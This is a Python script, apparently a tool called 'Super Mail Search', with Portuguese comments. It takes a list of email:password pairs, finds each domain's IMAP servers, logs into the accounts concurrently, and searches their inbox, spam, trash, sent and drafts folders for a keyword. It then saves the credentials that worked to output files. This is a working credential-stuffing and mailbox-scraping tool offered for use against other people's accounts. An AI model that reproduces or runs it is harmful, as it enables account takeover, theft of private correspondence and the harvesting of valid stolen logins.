import argparse
import gevent
from gevent import monkey
from gevent.pool import Pool
import dns.resolver
import imaplib
import logging
import socket
import time
import chardet
from typing import List, Tuple, Dict

# Aplicar monkey patch para tornar o código compatível com gevent
monkey.patch_all()

# Configuração básica de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Arte ASCII
ascii_art = r"""
  ____  _            _   _           
 |  _ \| |          | | | |          
 | |_) | | ___  ___ | |_| |_ ____ __ 
 |  _ <| |/ _ \/ __| __| __/ _ \ '__| 
 | |_) | |  __/\__ \ |_| ||  __/ |   
 |____/|_|\___||___/\__|\__\___|_|   Super Mail Search 
                                      By: ARDX
"""

def detect_encoding(file_path: str) -> str:
    """Detecta a codificação do arquivo.""" 
    try:
        with open(file_path, 'rb') as f:
            raw_data = f.read()
            result = chardet.detect(raw_data)
            encoding = result['encoding']
            if encoding is None:
                encoding = 'utf-8'  # Codificação padrão se a detecção falhar
    except Exception as e:
        logging.error(f'Erro ao detectar codificação do arquivo {file_path}: {e}')
        encoding = 'utf-8'  # Default para utf-8 em caso de erro
    return encoding

def read_credentials(file_path: str) -> List[Tuple[str, str]]:
    """Lê as credenciais de um arquivo.""" 
    credentials = []
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                email, password = line.split(':', 1)
                credentials.append((email.strip(), password.strip()))
    except FileNotFoundError as e:
        logging.error(f'Arquivo de credenciais não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de credenciais: {e}')
    return credentials

def read_imap_servers(file_path: str) -> Dict[str, int]:
    """Lê servidores IMAP e suas portas de um arquivo.""" 
    servers = {}
    encoding = detect_encoding(file_path)
    try:
        with open(file_path, 'r', encoding=encoding) as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':')
                    if len(parts) == 2:
                        server = parts[0].strip()
                        port_str = parts[1].strip()
                        if port_str.isdigit():
                            port = int(port_str)
                            if port in [143, 993]:  # Verifica se a porta é IMAP (143 ou 993)
                                servers[server] = port
                            else:
                                logging.warning(f'Porta inválida para IMAP encontrada: {port_str}')
                        else:
                            logging.warning(f'Porta inválida encontrada: {port_str}')
                    else:
                        logging.warning(f'Linha com formato incorreto: {line}')
                else:
                    logging.warning(f'Linha sem formato de servidor e porta encontrada: {line}')
    except FileNotFoundError as e:
        logging.error(f'Arquivo de servidores IMAP não encontrado: {e}')
    except Exception as e:
        logging.error(f'Erro ao ler o arquivo de servidores IMAP: {e}')
    return servers

def discover_imap_servers(domain: str) -> List[str]:
    """Descobre servidores IMAP usando registros MX e subdomínios comuns.""" 
    servers = []
    try:
        mx_records = dns.resolver.resolve(domain, 'MX')
        for r in mx_records:
            servers.append(str(r.exchange).rstrip('.'))
    except dns.resolver.NoAnswer:
        logging.warning(f'Nenhum registro MX encontrado para {domain}')
    except dns.resolver.NXDOMAIN:
        logging.warning(f'Domínio não encontrado: {domain}')
    except Exception as e:
        logging.warning(f'Erro ao buscar registros MX para {domain}: {e}')
    
    servers.extend([
        f'imap.{domain}',
        f'webmail.{domain}',
        f'mail.{domain}'
    ])
    return servers

def try_connection(email: str, password: str, server: str, port: int, timeout: int = 30) -> imaplib.IMAP4_SSL:
    """Tenta conectar a um servidor IMAP com as credenciais fornecidas.""" 
    try:
        logging.info(f'Tentando conectar ao servidor IMAP {server}:{port} com {email}')
        mail = imaplib.IMAP4_SSL(server, port, timeout=timeout)
        mail.login(email, password)
        mail.select('inbox')
        return mail
    except (imaplib.IMAP4.error, socket.timeout, socket.gaierror) as e:
        logging.error(f'Erro ao conectar ou autenticar no servidor {server}:{port}: {e}')
        return None

def search_criteria(mail: imaplib.IMAP4_SSL, criteria: str, email: str, password: str, server: str, port: int, google_output_file: str) -> bool:
    """Busca por e-mails contendo o critério especificado em várias partes dos e-mails e pastas.""" 
    try:
        # Verifica em pastas importantes
        folders = ['inbox', 'spam', 'trash', 'sent', 'drafts']
        found = False

        for folder in folders:
            mail.select(folder)
            result, data = mail.search(None, 'ALL')
            if result == 'OK' and data[0]:
                email_ids = data[0].split()
                for email_id in email_ids:
                    result, msg_data = mail.fetch(email_id, '(RFC822)')
                    if result == 'OK':
                        for response_part in msg_data:
                            if isinstance(response_part, tuple):
                                msg = response_part[1].decode('utf-8', errors='ignore')
                                # Verifica a presença do critério de busca em todo o conteúdo do e-mail
                                if (criteria.lower() in msg.lower()):
                                    logging.info(f'Palavra-chave encontrada no e-mail {email_id} na pasta {folder} no servidor {server}')
                                    found = True
                                    break
                        if found:
                            break
            if found:
                break

        if found:
            with open(google_output_file, 'a') as f:
                f.write(f'{email}:{password}:{server}:{port}\n')  # Registro completo de e-mail, senha, servidor e porta
        return found
    except imaplib.IMAP4.error as e:
        logging.error(f'Erro ao buscar e-mails: {e}')
        return False

def process_email(email: str, password: str, criteria: str, imap_servers_file: str, output_file: str, google_output_file: str):
    """Processa cada conta de e-mail tentando conexões com vários servidores IMAP.""" 
    domain = email.split('@')[1]
    servers_to_try = discover_imap_servers(domain)
    servers_from_file = read_imap_servers(imap_servers_file)
    
    # Adiciona servidores da lista fornecida
    servers_to_try.extend(servers_from_file.keys())
    servers_to_try = list(set(servers_to_try))

    for server in servers_to_try:
        if server in servers_from_file:
            port = servers_from_file[server]  # Usar a porta correta listada no arquivo
        else:
            port = 993  # Porta padrão se não especificada
        
        try:
            mail = try_connection(email, password, server, port)
            if mail:
                found_criteria = search_criteria(mail, criteria, email, password, server, port, google_output_file)
                if found_criteria:
                    break
                mail.logout()
            time.sleep(1)  # Esperar antes de tentar o próximo servidor
        except Exception as e:
            logging.error(f'Erro inesperado com o servidor {server}:{port}: {e}')
    
    with open(output_file, 'a') as f:
        f.write(f'{email}:{password}\n')

def parse_arguments():
    """Analisa argumentos da linha de comando.""" 
    parser = argparse.ArgumentParser(
        description='Script para buscar e-mails em servidores IMAP e procurar palavras-chave específicas.'
    )
    parser.add_argument(
        '-i', '--input',
        required=True,
        help='Arquivo contendo as credenciais no formato email:senha.'
    )
    parser.add_argument(
        '-f', '--file',
        required=True,
        help='Arquivo contendo a lista de servidores IMAP e portas no formato servidor:porta.'
    )
    parser.add_argument(
        '-c', '--criteria',
        required=True,
        help='Palavra-chave para buscar nos e-mails.'
    )
    parser.add_argument(
        '-o', '--output',
        required=True,
        help='Arquivo para saída de credenciais encontradas.'
    )
    parser.add_argument(
        '-g', '--google-output',
        required=True,
        help='Arquivo para saída específica do Google.'
    )
    return parser.parse_args()

def main():
    """Função principal que coordena a execução do script.""" 
    print(ascii_art)
    args = parse_arguments()

    credentials = read_credentials(args.input)
    if not credentials:
        logging.error('Nenhuma credencial encontrada.')
        return

    pool = Pool(10)  # Número máximo de threads
    jobs = []

    for email, password in credentials:
        job = pool.spawn(process_email, email, password, args.criteria, args.file, args.output, args.google_output)
        jobs.append(job)

    gevent.joinall(jobs)

if __name__ == '__main__':
    main()
